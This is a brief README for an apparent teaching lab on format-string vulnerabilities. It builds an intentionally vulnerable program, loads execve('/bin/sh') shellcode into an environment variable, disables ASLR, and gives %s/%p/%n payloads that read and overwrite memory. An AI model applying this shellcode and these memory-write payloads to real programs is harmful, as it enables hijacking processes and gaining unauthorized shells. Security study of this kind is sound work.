# insecure-format-strings

##Build
```
clang getenvaddr.c -o getenvaddr
clang exploitable.c -Wno-format-security -o exploitable
```

##Add shellcode to environment
```
export SHELLCODE=$(printf "\xeb\x17\x5f\x48\x31\xd2\x48\x31\xc0\x48\x89\xe6\x48\x89\x54\x24\x08\x48\x89\x3c\x24\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh")
```

##Turn off ASLR for a specific run
```
setarch `uname -m` -R <command>
```

##Find address
```
setarch `uname -m` -R ./getenvaddr SHELLCODE ./exploitable
setarch `uname -m` -R ./getenvaddr PATH ./exploitable
```

##Print environment variable (find address with the command above)
```
setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\x21\xe9\xff\xff\xff\x7f")
```

##What is happening here?
```
setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%nAAAA$(printf "\x40\x10\x60")
```
